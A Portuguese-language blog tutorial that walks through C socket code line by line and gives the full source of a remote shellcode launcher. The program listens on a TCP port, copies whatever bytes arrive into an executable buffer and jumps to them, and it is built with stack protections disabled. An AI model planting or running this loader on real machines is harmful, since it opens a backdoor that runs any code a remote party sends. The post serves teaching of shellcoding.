<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8">
	<title>Socket Criando Shellcode Remote exec 0xc4</title>
	
	<meta name="author" content="mh4x0f">

	<!-- Enable responsive viewport -->
	<meta name="viewport" content="width=device-width, initial-scale=1.0">

	<!-- Le HTML5 shim, for IE6-8 support of HTML elements -->
	<!--[if lt IE 9]>
	<script src="http://html5shim.googlecode.com/svn/trunk/html5.js"></script>
	<![endif]-->

	<!-- Le styles -->
	<link href="/assets/resources/bootstrap/css/bootstrap.min.css" rel="stylesheet">
	<link href="/assets/resources/font-awesome/css/font-awesome.min.css" rel="stylesheet">
	<link href="/assets/resources/syntax/syntax.css" rel="stylesheet">
	<link href="/assets/css/style.css" rel="stylesheet">
	<link rel="shortcut icon" type="image/x-icon" href="/favicon.ico">
	<!-- Le fav and touch icons -->
	<!-- Update these with your own images
	<link rel="shortcut icon" href="images/favicon.ico">
	<link rel="apple-touch-icon" href="images/apple-touch-icon.png">
	<link rel="apple-touch-icon" sizes="72x72" href="images/apple-touch-icon-72x72.png">
	<link rel="apple-touch-icon" sizes="114x114" href="images/apple-touch-icon-114x114.png">
	-->

	<link rel="alternate" type="application/rss+xml" title="" href="/feed.xml">
</head>

<body>
	<nav class="navbar navbar-default visible-xs" role="navigation">
		<!-- Brand and toggle get grouped for better mobile display -->
		<div class="navbar-header">
			<button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#bs-example-navbar-collapse-1">
				<span class="sr-only">Toggle navigation</span>
				<span class="icon-bar"></span>
				<span class="icon-bar"></span>
				<span class="icon-bar"></span>
			</button>
			
			<a type="button" class="navbar-toggle nav-link" href="http://github.com/mh4x0f">
				<i class="fa fa-github"></i>
			</a>
			
			
			<a type="button" class="navbar-toggle nav-link" href="http://twitter.com/mh4x0f">
				<i class="fa fa-twitter"></i>
			</a>
			
			
			<a type="button" class="navbar-toggle nav-link" href="mailto:mh4root@gmail.com">
				<i class="fa fa-envelope"></i>
			</a>
			
			<a class="navbar-brand" href="/">
				<img src="http://avatars.githubusercontent.com/u/6795613" class="img-circle" />
				
			</a>
		</div>

		<!-- Collect the nav links, forms, and other content for toggling -->
		<div class="collapse navbar-collapse" id="bs-example-navbar-collapse-1">
			<ul class="nav navbar-nav">
				<li class="active"><a href="/">Home</a></li>
				<li><a href="/categories.html">Categories</a></li>
				<li><a href="/tags.html">Tags</a></li>
			</ul>
		</div><!-- /.navbar-collapse -->
	</nav>

	<!-- nav-menu-dropdown -->
	<div class="btn-group hidden-xs" id="nav-menu">
		<button type="button" class="btn btn-default dropdown-toggle" data-toggle="dropdown">
			<i class="fa fa-bars"></i>
		</button>
		<ul class="dropdown-menu" role="menu">
			<li><a href="/"><i class="fa fa-home"></i>Home</a></li>
			<li><a href="/categories.html"><i class="fa fa-folder"></i>Categories</a></li>
			<li><a href="/tags.html"><i class="fa fa-tags"></i>Tags</a></li>
			<li class="divider"></li>
			<li><a href="#"><i class="fa fa-arrow-up"></i>Top of Page</a></li>
		</ul>
	</div>

	<div class="col-sm-3 sidebar hidden-xs">
		<!-- sidebar.html -->
<header class="sidebar-header" role="banner">
	<a href="/">
		<img src="http://avatars.githubusercontent.com/u/6795613" class="img-circle" style="width:112px;height:112px;" />
	</a>
	<h3 class="title">
        <a href="/"></a>
    </h3>
</header>


<div id="bio" class="text-center">
	One 0x41414141 worth a thousand words
</div>

<div id="contact-list" class="text-center">
	<ul class="list-unstyled list-inline">
		
		<li>
			<a class="btn btn-default btn-sm" href="https://github.com/mh4x0f">
				<i class="fa fa-github-alt fa-lg"></i>
			</a>
		</li>
		
		
		<li>
			<a class="btn btn-default btn-sm" href="https://twitter.com/mh4x0f">
				<i class="fa fa-twitter fa-lg"></i>
			</a>
		</li>
		
		
		<li>
			<a class="btn btn-default btn-sm" href="mailto:mh4root@gmail.com">
				<i class="fa fa-envelope fa-lg"></i>
			</a>
		</li>
		
	</ul>
	<ul id="contact-list-secondary" class="list-unstyled list-inline">
		
		
		<form class="col-lg-12" action="http://feedburner.google.com/fb/a/mailverify?uri=chmodsecurity" method="post" target="popupwindow" onsubmit="window.open('http://feedburner.google.com/fb/a/mailverify?uri=chmodsecurity', 'popupwindow', 'scrollbars=yes,width=250,height=220');return true" >
			<div class="input-group" style="width:240px;text-align:center;margin:0 auto;">
			<input type="hidden" value="chmodsecurity" name="uri" >
		  <input type="hidden" name="loc" value="pt_BR">
		  <input  id="input-rss"  style="width:160px;text-align:center;" placeholder="Digite  seu e-mail" class="form-control input-lg" type="text" name="email">
		  <span class="input-group-btn"><button id="btn-assinar" class="btn btn-lg btn-primary"  type="submit" value=" ASSINAR ">Assinar</button></span>
	      </div>
		</form>
	</ul>
</div>
<!-- sidebar.html end -->

	</div>

	<div class="col-sm-9 col-sm-offset-3">
		<div class="page-header">
  <h1>Socket Criando Shellcode Remote exec 0xc4 </h1>
</div>
	
<article>
	<div class="col-sm-10">
	 <span class="post-date">
	   
	   July 
	   1st,
	     
	   2014
	 </span>
	  <div class="article_body">
	  <p>Novamente volto a falar, meu parceiro tudo que diz respeito a C com socket para Unix, vai ser bem vindo para nós. O grande lance é ganhar a lógica em Unix já que em windows a coisa muda um pouco porque vamos usar API, tudo no windows são as API's, até quando começamos a aprender assembly vamos dar uma passadinha por windows e vamos ver muita coisa sobre ela, mas no momento vamos continuar com nosso UNix :D; precisamos entender a fundo pois depois vamos apender a 'codar' do zero um socket PNET lol level total. Let's Gooooo: Na verdade esse artigo vai ser um complemento de um video meu não deu pra explicar tudo no video questão de tempo parceiro. Fiz o video para demostrar e acabei dando uma passada rápida no código em C, expliquei tudo de python, mas não em C vamos agora entender. #partiu</p>
<p>O foco aqui é C, outras coisas já vai da pra entender no video. só pra deixar bem claro  no video falo que os creditos não são meus já que o 'Vivik' que criou o script,eu já tinha feito algum parecido em Python como falei no video "como fazer um backdoor em python", que há uma possibilidade injetar um shellcode na memória. Agora vamos para o artigo, não vou falar dos Hearders já falei nos artigos passado não muda nada e também usa o google parceiro :D é uma ferramenta impressionante. então vai ai</p>

<div class="highlight"><pre><code class="language-c--" data-lang="c++"><span class="c1">//tirem os espaços das bibliotecas :D, é que da uns bug quando deixo com sem eles</span>
<span class="cp">#include&lt; stdio.h &gt;</span>
<span class="cp">#include&lt; stdlib.h &gt; </span>
<span class="cp">#include&lt; sys/socket.h &gt;</span>
<span class="cp">#include&lt; sys/types.h &gt;</span>
<span class="cp">#include&lt; error.h &gt;</span>
<span class="cp">#include&lt; strings.h &gt;</span>
<span class="cp">#include&lt; unistd.h &gt;</span>
<span class="cp">#include&lt; string.h &gt;</span>
<span class="cp">#include&lt; arpa/inet.h &gt;</span></code></pre></div>

<p>já que estou usando o a biblioteca 'error.h' como citei em um artigo passado fica mais dinâmico, também é questão de deixar as coisas mais profissionais :D coisa de programadores; string.h pois vamos usar o shellcode é ele nada mais é que uma string só que em Hexadecimal, as demais já são conhecida então vamos continuar :p.</p>

<div class="highlight"><pre><code class="language-c--" data-lang="c++"><span class="cp">#define ERROR	-1</span>
<span class="cp">#define MAX_DATA	2048	</span>
<span class="cp">#define MAX_SHELLCODE_LEN	4096</span>
 
<span class="kt">char</span> <span class="n">shellcode</span><span class="p">[</span><span class="n">MAX_SHELLCODE_LEN</span><span class="p">];</span></code></pre></div>

<p>Essas linhas acima também né ? define se nossa comunicação voltar -1 claro da um erro, e define tanho do máximo de dados e tamanho máximo do shellcode. isso é muito simples logo abaixo vai ficar tudo claro. As linhas que vem agora são totalmente conhecida por você lembra do outro artigo, falamos sobre a mesma e espero que tenha compreendido a função de cada uma mesmo assim vou comentar cada linha há vai assim mesmo vamos entender tudo novamente.</p>

<div class="highlight"><pre><code class="language-c--" data-lang="c++"><span class="n">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span>
<span class="p">{</span>
	<span class="k">struct</span> <span class="n">sockaddr_in</span> <span class="n">server</span><span class="p">;</span> <span class="c1">// estrutura server</span>
	<span class="k">struct</span> <span class="n">sockaddr_in</span> <span class="n">client</span><span class="p">;</span> <span class="c1">// estrutura cliente </span>
	<span class="kt">int</span> <span class="n">sock</span><span class="p">;</span> <span class="c1">// criar do descritor</span>
	<span class="kt">int</span> <span class="k">new</span><span class="p">;</span> <span class="c1">//segundo descritor</span>
	<span class="kt">int</span> <span class="n">sockaddr_len</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span> <span class="n">sockaddr_in</span><span class="p">);</span> <span class="c1">// tamanho da estrutura </span>
	<span class="kt">int</span> <span class="n">data_len</span><span class="p">,</span> <span class="n">shellcode_len</span><span class="p">;</span> <span class="c1">// variáveis de controle de dados</span>
	<span class="kt">char</span> <span class="n">data</span><span class="p">[</span><span class="n">MAX_DATA</span><span class="p">];</span> <span class="c1">// string com 2048 bytes</span>
	<span class="kt">int</span> <span class="p">(</span><span class="o">*</span><span class="n">fptr</span><span class="p">)();</span> <span class="c1">// ponteiro que no final vai entender o porque :D</span></code></pre></div>

<p>Tá no Ponto ? all right, então agora precisamos criar nosso socket e definir as struct com o protocolo e família entenda isso como uma revisão cara, do artigo anterior. vamos definir a famíla AF_INET, claro já sabemos TCP. a porta htons(atoi(argv[1]));, que vai receber o argumento 1, outra coisa eu nunca vi alguém falar o porque 'htons' eu acho que nego que nunca usou o PE, ai não sabe pra que serve é melhor entender agora logo o bom que já fica na mente quando falarmos dela futuramente, para entender melhor precisamos saber que estamos trabalhando com socket camada, é preciso converter o número da porta para <a>big endian</a>, eu falei sobre big endian na saga sobre desenvolvimento de exploit, mas como vamos usar futuramente em assembly, então vou explicar logo não é complicado, vamos lá: relacionado ao processador ele copia os dados para stack em little endian(ao contrário), mas lembre-se ele copia os dados bytes a bytes  funciona tipo assim;</p>
<pre class="code">
---------------------------------------------
(Big endian)-[enpurra-]-------&gt;AB CD EF GH IJ  
=============================================
                                            |
                                            |
---------------------------------------------
Stack (little endian)&lt;-----[recebe]----------  
---------------------------------------------
                   |
                   | Etapa 2 em ação
                   |
                   v
---------------------------------------------
(Big endian)-[enpurra-]----------&gt;AB CD EF GH IJ  {IJ cai}
=============================================  |
                                            |  |
                                            |  |
---------------------------------------------  v
Stack (little endian)&lt;-----[recebe]---------- [IJ] assim vai com todos os bytes
---------------------------------------------
                   |
                   | Etapa 3 em ação[dados copiados]
                   |
                   v
---------------------------------------------
(BE)-[enpurra-]-----------------------------&gt;    
=============================================  |
                                            |  |
                                            |  |
---------------------------------------------  v
Stack LE[recebe]----[IJ][GH][EF][CD][AB]-----
---------------------------------------------
</pre>
<p>Depois o processador que se vira para trazer os valores do jeito normal, assim vai ser quando usamos uma API em assembly futuramente, em socket como os dados vai ser estruturados e envelopados no pacote é preciso usar a htois para converter esses inteiro para big endian, 'Network Byte Orders' todos os computadores usam bytes na mesma ordem, e só tem duas maneiras de armazenar esse bytes ou em little endian ou big endian Assim que as máquinas com diferentes convenções de ordem de bytes podem se comunicar, os protocolos de Internet especificar uma convenção byte ordem canônica para os dados transmitidos através da rede. Isto é conhecido como Network Byte Order.

Ao estabelecer uma conexão de soquete Internet, você deve se certificar de que os dados no sin_port e membros sin_addr da estrutura sockaddr_in são representados em Network Byte Order. Vai ai uma tabela das funções:</p>
<p>&lt;pre class=code&gt;
Função	Descrição
htons ()	Host para Rede Curto
htonl ()	Host para rede de longa
ntohl ()	Rede de host longo
ntohs ()	Rede para o Host Curto
&lt;/pre&gt;</p>
<pre>
Aqui está mais detalhes destas funções:

htons curto não assinado (não assinado curto hostshort) 
Esta função converte (2 bytes) As quantidades de 16 bits da ordem de byte do host para a rede byte ordem.

htonl longo não assinado (hostlong longo não assinado) 
Esta função converte (4 bytes) quantidades de 32 bits da ordem de byte do host para a rede byte ordem.

ntohs curtos sem sinal (unsigned short netshort) 
Esta função converte (2 bytes) As quantidades de 16 bits a partir da ordem de bytes da rede para hospedar byte ordem.

ntohl longo não assinado (netlong longo não assinado)
Esta função converte quantidades de 32 bits a partir da ordem de bytes da rede para hospedar byte ordem.
</pre>
<p>
Estas funções são macros e resultam na inserção do código de fonte de conversão para o programa de chamada. Nas máquinas little-endian o código irá alterar os valores em torno de rede byte ordem. Em máquinas big-endian nenhum código é inserido uma vez que nenhum é necessário; as funções são definidas como nulo. eheheh faz parte aprender como as coisas funciona isso não é perca de tempo, vai ti ajudar meu amigo lá na frente, eu aposto que muitos programadores não sabem bulhufas de rede ai quando vai criar uma aplicação que usa rede pronto começa a dor de cabeça.</p>

<div class="highlight"><pre><code class="language-c--" data-lang="c++"><span class="k">if</span><span class="p">((</span><span class="n">sock</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">,</span> <span class="mi">0</span><span class="p">))</span> <span class="o">==</span> <span class="n">ERROR</span><span class="p">)</span>
	<span class="p">{</span>
		<span class="n">perror</span><span class="p">(</span><span class="s">&quot;server socket: &quot;</span><span class="p">);</span>
		<span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
	<span class="p">}</span>
		
	<span class="n">server</span><span class="p">.</span><span class="n">sin_family</span> <span class="o">=</span> <span class="n">AF_INET</span><span class="p">;</span>
	<span class="n">server</span><span class="p">.</span><span class="n">sin_port</span> <span class="o">=</span> <span class="n">htons</span><span class="p">(</span><span class="n">atoi</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]));</span>
	<span class="n">server</span><span class="p">.</span><span class="n">sin_addr</span><span class="p">.</span><span class="n">s_addr</span> <span class="o">=</span> <span class="n">INADDR_ANY</span><span class="p">;</span>
	<span class="n">bzero</span><span class="p">(</span><span class="o">&amp;</span><span class="n">server</span><span class="p">.</span><span class="n">sin_zero</span><span class="p">,</span> <span class="mi">8</span><span class="p">);</span> <span class="c1">// preenche a estrura</span></code></pre></div>

<p>Pronto, a primeira etapa já está OK, Eu não vejo nenhuma razão para preferir bzero sobre memset, memset é uma função C padrão, enquanto bzero nunca foi uma função C padrão. O raciocínio é provavelmente porque você pode conseguir exatamente a mesma funcionalidade usando memset função.. de ter diferença tem mas não vai mudar em nada. </p>

<div class="highlight"><pre><code class="language-c--" data-lang="c++"><span class="k">if</span><span class="p">((</span><span class="n">bind</span><span class="p">(</span><span class="n">sock</span><span class="p">,</span> <span class="p">(</span><span class="k">struct</span> <span class="n">sockaddr</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">server</span><span class="p">,</span> <span class="n">sockaddr_len</span><span class="p">))</span> <span class="o">==</span> <span class="n">ERROR</span><span class="p">)</span>
	<span class="p">{</span>
		<span class="n">perror</span><span class="p">(</span><span class="s">&quot;bind : &quot;</span><span class="p">);</span>
		<span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
	<span class="p">}</span>
	
	<span class="k">if</span><span class="p">((</span><span class="n">listen</span><span class="p">(</span><span class="n">sock</span><span class="p">,</span> <span class="mi">1</span><span class="p">))</span> <span class="o">==</span> <span class="n">ERROR</span><span class="p">)</span>
	<span class="p">{</span>
		<span class="n">perror</span><span class="p">(</span><span class="s">&quot;listen&quot;</span><span class="p">);</span>
		<span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
	<span class="p">}</span>
	
	<span class="k">if</span><span class="p">((</span><span class="k">new</span> <span class="o">=</span> <span class="n">accept</span><span class="p">(</span><span class="n">sock</span><span class="p">,</span> <span class="p">(</span><span class="k">struct</span> <span class="n">sockaddr</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">client</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">sockaddr_len</span><span class="p">))</span> <span class="o">==</span> <span class="n">ERROR</span><span class="p">)</span>
	<span class="p">{</span>
		<span class="n">perror</span><span class="p">(</span><span class="s">&quot;accept&quot;</span><span class="p">);</span>
		<span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
	<span class="p">}</span></code></pre></div>

<p>Há fala sério Man, não da pra explicar essas funções se esqueceu volta lá na moral, e dar uma olhada :D é muitos simples, olhe que estamos usando a função perror é melhor pra tratar erro do que ficar dando printf.</p>

<div class="highlight"><pre><code class="language-c--" data-lang="c++"><span class="n">data_len</span> <span class="o">=</span> <span class="n">shellcode_len</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
				
	<span class="k">do</span>
	<span class="p">{</span>
		<span class="n">data_len</span> <span class="o">=</span> <span class="n">recv</span><span class="p">(</span><span class="k">new</span><span class="p">,</span> <span class="n">data</span><span class="p">,</span> <span class="n">MAX_DATA</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
			
		<span class="k">if</span><span class="p">(</span><span class="n">data_len</span><span class="p">)</span>
		<span class="p">{</span>
			<span class="n">memcpy</span><span class="p">(</span><span class="o">&amp;</span><span class="n">shellcode</span><span class="p">[</span><span class="n">shellcode_len</span><span class="p">],</span> <span class="n">data</span><span class="p">,</span> <span class="n">data_len</span><span class="p">);</span>
			<span class="n">shellcode_len</span> <span class="o">+=</span> <span class="n">data_len</span><span class="p">;</span>
			<span class="k">if</span> <span class="p">(</span><span class="n">shellcode_len</span> <span class="o">&gt;</span> <span class="n">MAX_SHELLCODE_LEN</span><span class="p">)</span>
			<span class="p">{</span>
				<span class="n">printf</span><span class="p">(</span><span class="s">&quot;Received shellcode length exceeds MAX_SHELLCODE_LEN: exiting!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
				<span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
			<span class="p">}</span>
 
		<span class="p">}</span></code></pre></div>

<p>Ai também é muito simples, entra em um do-while, a função recv() que é do header  <a>sys/socket.h</a>, do ingles Receiving Data, o nome já diz ela fica esperando os seguintes parâmetros  recv (int socket, void *buffer, size_t size, int flags),  função deve receber uma mensagem de um soquete de conexão de modo ou de modo de conexão. É normalmente usado com sockets conectados porque não permite que o aplicativo para recuperar o endereço de origem de dados recebidos. Após a conclusão, recv () deve retornar o comprimento da mensagem em bytes. Se nenhuma mensagem estiver disponível para ser recebido e os pares tem realizado um desligamento ordenado, recv () deve retornar 0. Caso contrário, -1 será devolvido e errno definida para indicar o erro. logo em seguida vem coisa básico de C memcpy explicando vai memcpy (destino, origem, sizeof (destino)); em outras palavras eu copio o send() enviado pelo cliente para a variável shellcode, e comparo o tamanho do shellcode é maior que nossa variável tamanho máximo, se for maior eu sair fora do programa, é um simples tratamento  há o video vou colocar logo em baixo não se preocupe. vamos continuar  </p>

<div class="highlight"><pre><code class="language-c--" data-lang="c++"><span class="p">}</span><span class="k">while</span><span class="p">(</span><span class="n">data_len</span><span class="p">);</span>
 
		
	<span class="n">close</span><span class="p">(</span><span class="k">new</span><span class="p">);</span>
	<span class="n">close</span><span class="p">(</span><span class="n">sock</span><span class="p">);</span>
 
	<span class="k">if</span><span class="p">(</span><span class="n">shellcode_len</span><span class="p">)</span>
	<span class="p">{</span>
 
		<span class="n">printf</span><span class="p">(</span><span class="s">&quot;Shellcode size: %d</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="n">strlen</span><span class="p">(</span><span class="n">shellcode</span><span class="p">));</span>
		<span class="n">printf</span><span class="p">(</span><span class="s">&quot;Executing ...</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
		<span class="n">fptr</span> <span class="o">=</span> <span class="p">(</span><span class="kt">int</span><span class="p">(</span><span class="o">*</span><span class="p">)())</span><span class="n">shellcode</span><span class="p">;</span>
		<span class="p">(</span><span class="kt">int</span><span class="p">)(</span><span class="o">*</span><span class="n">fptr</span><span class="p">)();</span>
				
	<span class="p">}</span>
		
	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>		
<span class="p">}</span></code></pre></div>

<p>Agora se a variável data_len tiver algum dentor dela for diferente de 0, vou fechar os socket's já que não vamos usa-lo o resto agora é simples, tenho se tiver alguma coisa na variável do tamanho do shellcode, ai é só criar um ponteiro uma locação na memoria e depois direciono o nosso shellcode pro mesmo por isso definir int (*fptr) o asterico indica uma criação de um ponteiro, acho que você já sabia disso então isso é tudo pessoal.:D agora ficou bem explicado acho que fosse explicar isso tudo no video ficaria uma bosta 50 min, se eu fazer mais video vou deixa-lo bem curto e no artigo eu explico melhor agora sim, em muleque(a) ta virando black hat em C, falei que dava pra fazer muita coisa usando socket. até o próximo. fique com o código completo:</p>

<div class="highlight"><pre><code class="language-c--" data-lang="c++"><span class="cm">/*</span>
<span class="cm">  RemoteShellcodeLauncher.c </span>
<span class="cm">	Author: Vivek Ramachandran</span>
<span class="cm">	Email: vivek@securitytube.net </span>
<span class="cm">	</span>
<span class="cm">	License: Use as you please for both commercial/non-commercial with/without attribution </span>
<span class="cm">	</span>
<span class="cm">	Website: http://securitytube.net </span>
<span class="cm"> </span>
<span class="cm">	Infosec Training: http://SecurityTube-Training.com </span>
<span class="cm">	Checkout our Assembly Language and Shellcoding course! </span>
<span class="cm"> </span>
<span class="cm">	Disclaimer: Written in 30 mins by salvaging my old code, might be prone to error. Please fix yourself :)</span>
<span class="cm"> </span>
<span class="cm">	Compile: gcc RemoteShellcodeLauncher.c -z execstack -fno-stack-protector -o RemoteShellcodeLauncher</span>
<span class="cm"> </span>
<span class="cm">*/</span>
 
		
 
<span class="cp">#include&lt;stdio.h&gt;</span>
<span class="cp">#include&lt;stdlib.h&gt;</span>
<span class="cp">#include&lt;sys/socket.h&gt;</span>
<span class="cp">#include&lt;sys/types.h&gt;</span>
<span class="cp">#include&lt;error.h&gt;</span>
<span class="cp">#include&lt;strings.h&gt;</span>
<span class="cp">#include&lt;unistd.h&gt;</span>
<span class="cp">#include&lt;string.h&gt;</span>
<span class="cp">#include&lt;arpa/inet.h&gt;</span>
 
<span class="cp">#define ERROR	-1</span>
<span class="cp">#define MAX_DATA	2048	</span>
<span class="cp">#define MAX_SHELLCODE_LEN	4096</span>
 
<span class="kt">char</span> <span class="n">shellcode</span><span class="p">[</span><span class="n">MAX_SHELLCODE_LEN</span><span class="p">];</span>
 
<span class="n">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span>
<span class="p">{</span>
	<span class="k">struct</span> <span class="n">sockaddr_in</span> <span class="n">server</span><span class="p">;</span>
	<span class="k">struct</span> <span class="n">sockaddr_in</span> <span class="n">client</span><span class="p">;</span>
	<span class="kt">int</span> <span class="n">sock</span><span class="p">;</span>
	<span class="kt">int</span> <span class="k">new</span><span class="p">;</span>
	<span class="kt">int</span> <span class="n">sockaddr_len</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span> <span class="n">sockaddr_in</span><span class="p">);</span>
	<span class="kt">int</span> <span class="n">data_len</span><span class="p">,</span> <span class="n">shellcode_len</span><span class="p">;</span>
	<span class="kt">char</span> <span class="n">data</span><span class="p">[</span><span class="n">MAX_DATA</span><span class="p">];</span>
	<span class="kt">int</span> <span class="p">(</span><span class="o">*</span><span class="n">fptr</span><span class="p">)();</span>
	
	<span class="k">if</span><span class="p">((</span><span class="n">sock</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">,</span> <span class="mi">0</span><span class="p">))</span> <span class="o">==</span> <span class="n">ERROR</span><span class="p">)</span>
	<span class="p">{</span>
		<span class="n">perror</span><span class="p">(</span><span class="s">&quot;server socket: &quot;</span><span class="p">);</span>
		<span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
	<span class="p">}</span>
		
	<span class="n">server</span><span class="p">.</span><span class="n">sin_family</span> <span class="o">=</span> <span class="n">AF_INET</span><span class="p">;</span>
	<span class="n">server</span><span class="p">.</span><span class="n">sin_port</span> <span class="o">=</span> <span class="n">htons</span><span class="p">(</span><span class="n">atoi</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]));</span>
	<span class="n">server</span><span class="p">.</span><span class="n">sin_addr</span><span class="p">.</span><span class="n">s_addr</span> <span class="o">=</span> <span class="n">INADDR_ANY</span><span class="p">;</span>
	<span class="n">bzero</span><span class="p">(</span><span class="o">&amp;</span><span class="n">server</span><span class="p">.</span><span class="n">sin_zero</span><span class="p">,</span> <span class="mi">8</span><span class="p">);</span>
			
	<span class="k">if</span><span class="p">((</span><span class="n">bind</span><span class="p">(</span><span class="n">sock</span><span class="p">,</span> <span class="p">(</span><span class="k">struct</span> <span class="n">sockaddr</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">server</span><span class="p">,</span> <span class="n">sockaddr_len</span><span class="p">))</span> <span class="o">==</span> <span class="n">ERROR</span><span class="p">)</span>
	<span class="p">{</span>
		<span class="n">perror</span><span class="p">(</span><span class="s">&quot;bind : &quot;</span><span class="p">);</span>
		<span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
	<span class="p">}</span>
	
	<span class="k">if</span><span class="p">((</span><span class="n">listen</span><span class="p">(</span><span class="n">sock</span><span class="p">,</span> <span class="mi">1</span><span class="p">))</span> <span class="o">==</span> <span class="n">ERROR</span><span class="p">)</span>
	<span class="p">{</span>
		<span class="n">perror</span><span class="p">(</span><span class="s">&quot;listen&quot;</span><span class="p">);</span>
		<span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
	<span class="p">}</span>
	
	<span class="k">if</span><span class="p">((</span><span class="k">new</span> <span class="o">=</span> <span class="n">accept</span><span class="p">(</span><span class="n">sock</span><span class="p">,</span> <span class="p">(</span><span class="k">struct</span> <span class="n">sockaddr</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">client</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">sockaddr_len</span><span class="p">))</span> <span class="o">==</span> <span class="n">ERROR</span><span class="p">)</span>
	<span class="p">{</span>
		<span class="n">perror</span><span class="p">(</span><span class="s">&quot;accept&quot;</span><span class="p">);</span>
		<span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
	<span class="p">}</span>
		
 
	<span class="n">data_len</span> <span class="o">=</span> <span class="n">shellcode_len</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
				
	<span class="k">do</span>
	<span class="p">{</span>
		<span class="n">data_len</span> <span class="o">=</span> <span class="n">recv</span><span class="p">(</span><span class="k">new</span><span class="p">,</span> <span class="n">data</span><span class="p">,</span> <span class="n">MAX_DATA</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
			
		<span class="k">if</span><span class="p">(</span><span class="n">data_len</span><span class="p">)</span>
		<span class="p">{</span>
			<span class="n">memcpy</span><span class="p">(</span><span class="o">&amp;</span><span class="n">shellcode</span><span class="p">[</span><span class="n">shellcode_len</span><span class="p">],</span> <span class="n">data</span><span class="p">,</span> <span class="n">data_len</span><span class="p">);</span>
			<span class="n">shellcode_len</span> <span class="o">+=</span> <span class="n">data_len</span><span class="p">;</span>
			<span class="k">if</span> <span class="p">(</span><span class="n">shellcode_len</span> <span class="o">&gt;</span> <span class="n">MAX_SHELLCODE_LEN</span><span class="p">)</span>
			<span class="p">{</span>
				<span class="n">printf</span><span class="p">(</span><span class="s">&quot;Received shellcode length exceeds MAX_SHELLCODE_LEN: exiting!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
				<span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
			<span class="p">}</span>
 
		<span class="p">}</span>
			 
	<span class="p">}</span><span class="k">while</span><span class="p">(</span><span class="n">data_len</span><span class="p">);</span>
 
		
	<span class="n">close</span><span class="p">(</span><span class="k">new</span><span class="p">);</span>
	<span class="n">close</span><span class="p">(</span><span class="n">sock</span><span class="p">);</span>
 
	<span class="k">if</span><span class="p">(</span><span class="n">shellcode_len</span><span class="p">)</span>
	<span class="p">{</span>
 
		<span class="n">printf</span><span class="p">(</span><span class="s">&quot;Shellcode size: %d</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="n">strlen</span><span class="p">(</span><span class="n">shellcode</span><span class="p">));</span>
		<span class="n">printf</span><span class="p">(</span><span class="s">&quot;Executing ...</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
		<span class="n">fptr</span> <span class="o">=</span> <span class="p">(</span><span class="kt">int</span><span class="p">(</span><span class="o">*</span><span class="p">)())</span><span class="n">shellcode</span><span class="p">;</span>
		<span class="p">(</span><span class="kt">int</span><span class="p">)(</span><span class="o">*</span><span class="n">fptr</span><span class="p">)();</span>
				
	<span class="p">}</span>
		
	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>		
<span class="p">}</span></code></pre></div>

<h3>Video Demostrativo :D<h3><br />
<iframe width="800" height="500" src="//www.youtube.com/embed/h4rz4mgzEqg" frameborder="0" allowfullscreen=""></iframe>
</h3></h3>

	  </div>

		
		<ul class="tag_box list-unstyled list-inline">
		  <li><i class="fa fa-folder-open"></i></li>
		  
		  
			 
				<li><a href="/categories.html#c programming-ref">
					c programming <span>(7)</span>
					
				</a></li>
			
		  
		</ul>
		  

		
		<ul class="list-inline">
		  <li><i class="fa fa-tags"></i></li>
		  
		  
			 
				<li>
					<a href="/tags.html#shellcode remote-ref">
					shellcode remote <span>(1)</span>
					,
					</a>
				</li>
			 
				<li>
